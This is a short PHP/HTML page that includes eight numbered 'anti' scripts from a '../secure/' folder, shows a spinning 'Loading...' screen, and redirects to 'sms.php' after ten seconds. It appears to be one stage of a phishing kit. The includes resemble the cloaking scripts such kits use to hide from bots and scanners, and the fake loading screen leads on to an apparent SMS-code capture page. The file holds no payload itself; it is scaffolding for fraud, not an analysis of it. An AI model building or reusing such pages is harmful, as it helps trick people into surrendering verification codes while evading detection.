
<?php

    include '../secure/anti1.php';
	include '../secure/anti2.php';
	include '../secure/anti3.php';
	include '../secure/anti4.php';
	include '../secure/anti5.php';
	include '../secure/anti6.php';
	include '../secure/anti7.php';
	include '../secure/anti8.php';


?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="refresh" content="10; url=sms.php">
  <title>Loading...</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background-color: white;
    }
    
    .loader {
      border: 4px solid rgba(255, 255, 255, 0.3);
      border-top: 4px solid yellow;
      border-radius: 50%;
      width: 125px;
      height: 125px;
      animation: spin 2s linear infinite;
    }
    
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="loader"></div>
</body>
</html>
